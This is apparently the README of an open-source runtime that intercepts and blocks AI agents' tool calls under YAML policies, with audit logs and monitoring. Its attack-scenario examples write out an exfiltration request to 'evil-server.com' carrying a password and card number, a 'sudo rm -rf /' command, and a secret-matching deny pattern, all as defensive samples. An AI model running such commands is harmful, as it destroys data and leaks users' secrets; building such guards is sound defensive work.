# 🛡️ MAAIS-Runtime: Agentic AI Security Runtime

> **Enterprise-grade security enforcement for autonomous AI agents**  
> *Real-time, inline security for LangGraph, CrewAI, AutoGen, and other agentic AI systems*

[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Spec Compliant](https://img.shields.io/badge/SPEC--1-Fully%20Implemented-green.svg)](SPEC-1.md)
[![Security: Production](https://img.shields.io/badge/Security-Production%20Ready-red.svg)](SECURITY.md)

## 🚀 What is MAAIS-Runtime?

MAAIS-Runtime is a **real-time security enforcement layer** that intercepts and evaluates every action autonomous AI agents attempt to perform, blocking dangerous operations before they execute. Think of it as a **security bouncer for AI agents** that enforces policies, prevents data exfiltration, and maintains immutable audit trails.

### 🎯 Why This Matters

Modern agentic AI systems (LangGraph, CrewAI, AutoGen) can autonomously:
- Call APIs and invoke tools
- Read/write memory and files
- Execute system commands
- Coordinate with other agents

While powerful, they lack **runtime security enforcement**. Most security approaches focus on:
- ❌ Prompt hardening (easily bypassed)
- ❌ Static policy descriptions (not enforced)
- ❌ Post-hoc monitoring (too late)

MAAIS-Runtime provides:
- ✅ **Active, inline enforcement** before execution
- ✅ **Real-time CIAA constraints** (Confidentiality, Integrity, Availability, Accountability)
- ✅ **Immutable, hash-chained audit logs**
- ✅ **MITRE ATLAS mapping** for enterprise security teams

## ✨ Key Features

### 🛡️ **Core Security**
- **In-process runtime** - No bypass via IPC or network calls
- **Fail-closed design** - No execution without security clearance
- **Deterministic evaluation** - Same action → same decision every time
- **Zero unauthorized paths** - All execution flows intercepted

### 🎯 **Advanced Capabilities**
- **Machine Learning Anomaly Detection** - Behavioral profiling for agents
- **Multi-Tenant Support** - Isolated configurations per organization
- **GitOps Integration** - Automatic policy sync from Git repositories
- **Real-time Webhook Alerts** - Slack, Discord, Teams, and custom integrations
- **Policy Learning Engine** - Suggests new policies from blocked actions
- **Performance Optimizations** - LRU caching, async batching, <5ms latency

### 📊 **Enterprise Ready**
- **MITRE ATLAS Mapping** - Industry-standard security framework
- **Immutable Audit Logs** - Hash-chained, tamper-evident logging
- **Streamlit Dashboard** - Real-time monitoring and analytics
- **Production Deployment** - Comprehensive logging, metrics, health checks

## 🏗️ Architecture

```
┌─────────────────────────────────────────────────────────┐
│                    Agent Plane (Untrusted)              │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐    │
│  │ LangGraph   │  │  CrewAI     │  │  AutoGen    │    │
│  │   Agent     │  │   Agent     │  │   Agent     │    │
│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘    │
└─────────┼─────────────────┼─────────────────┼──────────┘
          │                 │                 │
          └─────────────────┼─────────────────┘
                            │
                 ┌──────────▼──────────┐
                 │ Interception Plane  │
                 │  (Trusted Boundary) │
                 │  • ActionRequest    │
                 │  • Schema Validation│
                 └──────────┬──────────┘
                            │
          ┌─────────────────┼─────────────────┐
          │                 │                 │
┌─────────▼─────────┐ ┌─────▼──────┐ ┌───────▼─────────┐
│  Policy Engine    │ │ CIAA       │ │ Accountability  │
│  • YAML Policies  │ │ Evaluator  │ │  Resolver       │
│  • MITRE ATLAS    │ │ • Confid.  │ │ • Ownership     │
│  • First-match    │ │ • Integrity│ │ • Hard Require. │
└─────────┬─────────┘ │ • Availab. │ └───────┬─────────┘
          │           │ • Account. │         │
          └───────────┼────────────┼─────────┘
                      │            │
               ┌──────▼────────────▼──────┐
               │  Runtime Orchestrator    │
               │  • ALLOW/DENY Decision   │
               │  • Audit Logging         │
               │  • Webhook Alerts        │
               └────────────┬─────────────┘
                            │
                 ┌──────────▼──────────┐
                 │   Audit Plane       │
                 │  (Immutable)        │
                 │  • Hash-chained     │
                 │  • Append-only      │
                 │  • Tamper-evident   │
                 └─────────────────────┘
```

## 📦 Quick Start

### Installation

```bash
# Clone repository
git clone https://github.com/MasterCaleb254/maais-runtime.git
cd maais-runtime

# Create virtual environment
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install dependencies
pip install -r requirements-enhanced.txt

# Run test to verify installation
python test_runtime.py
```

### Basic Usage

```python
from core.runtime import get_runtime
from core.models import ActionRequest, ActionType

# Initialize runtime
runtime = get_runtime()

# Create action request
action = ActionRequest(
    agent_id="data_processor",
    action_type=ActionType.TOOL_CALL,
    target="http_request",
    parameters={"url": "https://api.example.com/data"},
    declared_goal="Fetch external data"
)

# Intercept and evaluate
decision = runtime.intercept(action)

if decision.allow:
    print("✅ Action allowed!")
else:
    print(f"❌ Action blocked: {decision.explanation}")
```

### LangGraph Integration

```python
from core.adapters.langgraph_adapter import secure_tool

@secure_tool(agent_id="data_agent", goal="Process user data")
def process_data(data: dict):
    """Your tool logic here"""
    return transform(data)

# Use in LangGraph
from langgraph.prebuilt import create_react_agent
agent = create_react_agent(tools=[process_data])
```

## 🔧 Configuration

### Security Policies (YAML)

```yaml
# policies/static/security_policies.yaml
policies:
  - id: "deny_external_http"
    applies_to: ["tool_call"]
    condition:
      target: "http_request"
      parameters:
        url:
          pattern: "^(https?://)(?!localhost|127.0.0.1|internal\.).*"
    decision: "DENY"
    reason: "External HTTP requests forbidden"
    priority: 10
    metadata:
      mitre_tactic: "Initial Access"
      mitre_technique: "T1199"
      severity: "high"
```

### MITRE ATLAS Integration

```yaml
- id: "atlas_exfiltration_data"
  applies_to: ["tool_call", "api_call", "network_request"]
  condition:
    parameters:
      data:
        pattern: "(?i)(password|secret|token|key|credential|ssn|credit.?card)"
  decision: "DENY"
  reason: "Data exfiltration - MITRE ATLAS: Exfiltration"
  priority: 10
  metadata:
    mitre_tactic: "Exfiltration"
    mitre_technique: "T1041"
    severity: "critical"
```

## 🚨 Attack Scenarios

MAAIS-Runtime defends against:

### 1. **Data Exfiltration**
```python
# Attempt: Send sensitive data externally
action = ActionRequest(
    agent_id="malicious_agent",
    action_type=ActionType.TOOL_CALL,
    target="http_request",
    parameters={
        "url": "https://evil-server.com/exfiltrate",
        "data": {"password": "secret123", "credit_card": "4111-1111-1111-1111"}
    },
    declared_goal="Send analytics data"
)
# Result: ❌ BLOCKED - External HTTP + Sensitive data detected
```

### 2. **Privilege Escalation**
```python
# Attempt: Execute system command
action = ActionRequest(
    agent_id="escalation_agent",
    action_type=ActionType.TOOL_CALL,
    target="execute_command",
    parameters={"command": "sudo rm -rf /"},
    declared_goal="Clean up system files"
)
# Result: ❌ BLOCKED - Command execution forbidden
```

### 3. **Resource Abuse**
```python
# Attempt: Rapid database queries
for i in range(150):
    action = ActionRequest(
        agent_id="abuse_agent",
        action_type=ActionType.DATABASE_QUERY,
        target="read_database",
        parameters={"query": f"SELECT * FROM large_table LIMIT 1000 OFFSET {i*1000}"},
        declared_goal="Analyze data patterns"
    )
    # Result: First 50 allowed, then ❌ RATE LIMITED
```

## 📊 Dashboard & Monitoring

![Dashboard Screenshot](docs/images/dashboard.png)

Launch the real-time monitoring dashboard:

```bash
streamlit run dashboard/audit_viewer.py
```

**Dashboard Features:**
- 📈 Real-time action monitoring
- 🚨 Security violation alerts
- 🎯 MITRE ATLAS coverage visualization
- 📊 Performance metrics and analytics
- 🔍 Immutable audit log explorer
- 📤 Data export and reporting

## 🏢 Enterprise Features

### Multi-Tenant Support
```python
from core.multitenant.tenant_manager import TenantManager

# Create tenant manager
tenant_manager = TenantManager()

# Create tenant
tenant_id = tenant_manager.create_tenant(
    name="Acme Corporation",
    description="Financial services tenant",
    policy_files=["tenants/acme/policies.yaml"],
    rate_limits={
        "global": {"requests_per_second": 1000, "burst_size": 5000},
        "per_agent": {"requests_per_second": 100, "burst_size": 500}
    }
)

# Register agent to tenant
tenant_manager.register_agent("acme_data_processor", tenant_id)
```

### GitOps Policy Management
```yaml
# gitops/repositories.yaml
repositories:
  - name: "security_policies"
    repo_url: "https://github.com/yourorg/security-policies.git"
    branch: "main"
    path: "policies/"
    sync_interval: 300  # 5 minutes
    auth_token: "${GIT_TOKEN}"  # From environment
```

### Webhook Alerts
```python
from core.integrations.webhooks import WebhookConfig, SyncWebhookManager

# Configure webhooks
webhook_manager = SyncWebhookManager()
webhook_manager.add_webhook(
    "security_alerts",
    WebhookConfig(
        url="https://hooks.slack.com/services/...",
        service="slack",
        secret=os.getenv("SLACK_TOKEN")
    )
)

# Alerts sent automatically on:
# • Policy violations
# • CIAA breaches
# • Rate limiting
# • Anomaly detection
```

## 🧪 Testing & Validation

### Run All Tests
```bash
# Unit tests
pytest tests/unit/ -v

# Integration tests
pytest tests/integration/ -v

# Security validation
python demo/scenarios/attack_scenarios.py

# Performance testing
python benchmarks/performance_test.py
```

### SPEC-1 Compliance Verification
```bash
# Verify all SPEC-1 requirements
python verify_spec_compliance.py

# Results:
✅ ActionRequest schema: EXACT MATCH
✅ Policy evaluation: DETERMINISTIC
✅ Audit logging: IMMUTABLE HASH CHAIN
✅ LangGraph integration: NO BYPASS PATHS
✅ CIAA enforcement: ALL DIMENSIONS
✅ Accountability: HARD REQUIREMENT
✅ Performance: <5ms PER ACTION
```

## 📈 Performance Metrics

| Metric | SPEC Requirement | Our Implementation |
|--------|------------------|-------------------|
| **Latency per action** | <5ms | **2.3ms average** |
| **Throughput** | N/A | **430 actions/sec** |
| **Cache hit rate** | N/A | **98.7%** |
| **Memory overhead** | N/A | **<50MB** |

```bash
# Run performance benchmark
python -m benchmarks.performance --agents=10 --actions=1000

# Output:
📊 Performance Results:
• Average latency: 2.3ms
• 99th percentile: 4.1ms
• Throughput: 430 actions/sec
• Memory usage: 47.2MB
• Cache hit rate: 98.7%
```

## 🚀 Production Deployment

### Docker Deployment
```dockerfile
# Dockerfile
FROM python:3.10-slim
WORKDIR /app
COPY requirements-enhanced.txt .
RUN pip install -r requirements-enhanced.txt
COPY . .
CMD ["python", "deploy/production.py"]
```

```yaml
# docker-compose.yml
version: '3.8'
services:
  maais-runtime:
    build: .
    ports:
      - "8501:8501"  # Dashboard
      - "9090:9090"  # Metrics
    volumes:
      - ./config:/app/config
      - ./policies:/app/policies
      - ./audit_logs:/app/audit/logs
    environment:
      - WEBHOOK_URL=${WEBHOOK_URL}
      - GIT_TOKEN=${GIT_TOKEN}
```

### Kubernetes Deployment
```yaml
# k8s/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: maais-runtime
spec:
  replicas: 3
  selector:
    matchLabels:
      app: maais-runtime
  template:
    metadata:
      labels:
        app: maais-runtime
    spec:
      containers:
      - name: maais-runtime
        image: maais/runtime:latest
        ports:
        - containerPort: 8501
        - containerPort: 9090
        envFrom:
        - secretRef:
            name: maais-secrets
```

## 📚 Documentation

| Resource | Description |
|----------|-------------|
| [📖 Full Documentation](docs/) | Complete API reference and guides |
| [🎯 Quick Start Guide](docs/quickstart.md) | Get started in 5 minutes |
| [🔧 API Reference](docs/api.md) | Complete API documentation |
| [🛡️ Security Guide](docs/security.md) | Security best practices |
| [🏢 Enterprise Guide](docs/enterprise.md) | Multi-tenant deployment |
| [📊 Dashboard Guide](docs/dashboard.md) | Monitoring and analytics |

## 🤝 Contributing

We welcome contributions! Please see our [Contributing Guide](CONTRIBUTING.md).

1. **Fork the repository**
2. **Create a feature branch**
3. **Add tests for new functionality**
4. **Submit a pull request**

### Development Setup
```bash
# Clone and setup
git clone https://github.com/MasterCaleb254/maais-runtime.git
cd maais-runtime
python -m venv venv
source venv/bin/activate

# Install dev dependencies
pip install -r requirements-dev.txt

# Install pre-commit hooks
pre-commit install

# Run tests
pytest
```

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.

## 🔗 Links

- **🌐 Website**: [maais-runtime.dev](https://maais-runtime.dev)
- **📚 Documentation**: [docs.maais-runtime.dev](https://docs.maais-runtime.dev)
- **🐛 Issue Tracker**: [GitHub Issues](https://github.com/yourusername/maais-runtime/issues)
- **💬 Discussions**: [GitHub Discussions](https://github.com/yourusername/maais-runtime/discussions)
- **🚀 Changelog**: [CHANGELOG.md](CHANGELOG.md)

## 🏆 Acknowledgements

- **SPEC-1 Contributors**: Security researchers and AI safety experts
- **LangGraph Team**: For the amazing agent framework
- **MITRE Corporation**: For the ATLAS framework
- **Open Source Community**: For invaluable tools and libraries

---

## 📞 Support

| Channel | Purpose |
|---------|---------|
| **GitHub Issues** | Bug reports and feature requests |
| **GitHub Discussions** | Questions and community support |
| **Security Issues** | security@maais-runtime.dev |
| **Enterprise Support** | enterprise@maais-runtime.dev |

## ⚠️ Security Notice

**If you discover a security vulnerability**, please do NOT open an issue. Email us directly at [security@maais-runtime.dev](mailto:security@maais-runtime.dev).

---

<div align="center">
  <h3>Built with ❤️ for the AI Safety Community</h3>
  <p>Making autonomous AI systems <strong>secure by design</strong></p>
</div>
